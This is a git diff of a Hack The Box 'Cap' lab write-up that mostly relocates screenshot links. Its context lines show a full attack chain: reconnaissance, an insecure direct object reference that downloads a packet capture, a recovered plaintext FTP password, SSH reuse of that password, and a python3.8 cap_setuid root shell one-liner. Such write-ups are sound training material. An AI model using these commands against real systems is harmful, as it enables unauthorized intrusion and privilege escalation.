@@ -148,7 +148,7 @@ nmap -Pn -sC -sV -oA cap_initial 10.129.79.148
 | `-oA`  | Save output in normal, XML, and grepable formats |
 
 **Figure 1.** Initial Nmap service discovery scan.
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab.png?raw=true)
 
 | Port | Service | Version       | Purpose         | Priority |
 | ---: | ------- | ------------- | --------------- | -------- |
@@ -207,7 +207,7 @@ Fingerprinting helps determine the underlying web server, client-side frameworks
 whatweb http://10.129.79.148
 ```
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab1.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab1.png?raw=true)
 
 The WhatWeb scan identified several technologies and frameworks associated with the application, including:
 
@@ -228,9 +228,9 @@ These findings justified performing deeper application enumeration.
 ```bash
 curl -I http://10.129.79.148
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab2.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab2.png?raw=true)
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab3.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab3.png?raw=true)
 
 While I was reviewing the HTML source revealed multiple administrative functions exposed through the application's navigation menu.
 
@@ -250,9 +250,9 @@ Features responsible for collecting, storing, or displaying sensitive network da
 > At this stage of the assessment, the Security Snapshot feature appeared to represent the largest potential attack surface because it involved creating and retrieving network capture files. Functionality that references stored objects often becomes a candidate for authorization testing during subsequent vulnerability analysis.
 
 curl http://10.129.79.148/ip
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab4.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab4.png?raw=true)
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab5.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab5.png?raw=true)
 
 The IP Configuration page displayed the network configuration of the underlying Linux host directly within the web application.
 
@@ -278,8 +278,8 @@ The exposure represents unnecessary information disclosure that could assist rec
 
 curl http://10.129.79.148/netstat
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab6.png?raw=true)
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab7.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab6.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab7.png?raw=true)
 
 The Network Status page returned the output of the Linux netstat utility directly through the web interface.
 
@@ -297,7 +297,7 @@ While these services had already been identified through external reconnaissance
 
 Such functionality should normally be restricted to authenticated administrators because it provides valuable intelligence regarding internal system activity.
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab8.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab8.png?raw=true)
 
 # My Observation
 Requesting the Security Snapshot endpoint resulted in an HTTP redirect rather than immediately displaying content.
@@ -338,8 +338,8 @@ Particular attention was given to the **Security Snapshot** feature after observ
 
 curl http://10.129.79.148/data/1
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab9.png?raw=true)
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab10.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab9.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab10.png?raw=true)
 
 The request successfully returned the contents of the first stored capture.
 
@@ -353,8 +353,8 @@ The response contained:
 
   curl -L http://10.129.79.148/capture
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab11.png?raw=true)
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab12.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab11.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab12.png?raw=true)
 
 Following the redirect automatically caused the application to generate a new capture.
 
@@ -393,8 +393,8 @@ The next phase focused on determining whether modifying the object identifier wo
 
 curl http://10.129.79.148/data/0
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab13.png?raw=true)
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab14.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab13.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab14.png?raw=true)
 
 The application successfully returned packet capture statistics for object identifier 0.
 
@@ -411,7 +411,7 @@ Download endpoint:
 
 curl -I http://10.129.79.148/download/0
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab16.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab16.png?raw=true)
 
 The server responded with HTTP 200 OK.
 
@@ -453,7 +453,7 @@ After identifying that packet captures were referenced using sequential identifi
 
 curl http://10.129.79.148/data/3
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab15.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab15.png?raw=true)
 
 The application redirected the request back to the homepage instead of returning packet capture data.
 
@@ -522,7 +522,7 @@ Since the response headers confirmed that a packet capture file could be downloa
 wget http://10.129.79.148/download/0
 mv 0 0.pcap
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab17.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab17.png?raw=true)
 
 The application successfully returned the packet capture file associated with object identifier `0`.
 
@@ -533,8 +533,8 @@ The file was downloaded without authentication or authorization checks and saved
 ```bash
 tshark -r 0.pcap
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab18.png?raw=true)
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab19.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab18.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab19.png?raw=true)
 
 Initial inspection of the packet capture revealed both HTTP and FTP traffic.
 
@@ -545,8 +545,8 @@ The FTP session was of particular interest because authentication exchanges are 
 ```bash
 strings 0.pcap
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab20.png?raw=true)
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab21.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab20.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab21.png?raw=true)
 
 The packet capture contained plaintext FTP authentication credentials.
 
@@ -563,7 +563,7 @@ PASS Buck3tH4TF0RM3!
 ```bash
 tshark -r 0.pcap -Y http
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab22.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab22.png?raw=true)
 
 Filtering the capture for HTTP traffic confirmed normal web requests associated with the application.
 
@@ -574,7 +574,7 @@ This helped separate routine web activity from the FTP authentication exchange, 
 ```bash
 ssh nathan@10.129.79.148
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab23.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab23.png?raw=true)
 
 The recovered credentials were successfully reused to authenticate to the SSH service.
 
@@ -603,7 +603,7 @@ hostname
 pwd
 ```
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab24.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab24.png?raw=true)
 
 ### Analysis
 
@@ -617,7 +617,7 @@ Establishing the current execution context is an essential first step because it
 uname -a
 cat /etc/os-release
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab25.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab25.png?raw=true)
 
 The target system was identified as:
 
@@ -636,7 +636,7 @@ At this stage of the assessment, the operating system information was recorded t
 ```bash
 sudo -i
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab26.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab26.png?raw=true)
 
 The user nathan is not in the sudoers file.
 
@@ -679,7 +679,7 @@ Misconfigured capabilities assigned to general-purpose executables can introduce
 ```bash
 getcap -r / 2>/dev/null
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab27.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab27.png?raw=true)
 
 | Binary                         | Capability                              | Assessment                         |
 | ------------------------------ | --------------------------------------- | ---------------------------------- |
@@ -707,7 +707,7 @@ Because `cap_setuid` permits a process to change its effective user ID, this fin
 crontab -l
 ls -la /etc/cron*
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab28.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab28.png?raw=true)
 
 The assessment identified standard system cron directories and scheduled maintenance tasks.
 
@@ -724,7 +724,7 @@ The observed cron entries corresponded to standard Ubuntu maintenance activities
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab29.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab29.png?raw=true)
 
 | Binary      | Status   |
 | ----------- | -------- |
@@ -747,7 +747,7 @@ Although `pkexec` was present, exploitation was not attempted because the assess
 ```bash
 getcap /usr/bin/python3.8
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab30.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab30.png?raw=true)
 
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 
@@ -761,7 +761,7 @@ Unlike standard Linux capability assignments that are typically limited to speci
 ```bash
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab31.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab31.png?raw=true)
 
 The Python interpreter successfully invoked the `setuid(0)` system call and spawned a new shell with an effective user ID of 0.
 
@@ -771,7 +771,7 @@ This demonstrated that the capability assignment was sufficient to bypass normal
 
 ### Root Verification
 
-![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/htblab34.png?raw=true)
+![Image Alt](https://github.com/cyberhacky/htb-cap-writeup/blob/main/screenshots/htblab34.png?raw=true)
 
 Access to the `/root` directory confirmed complete administrative control of the target system.
 
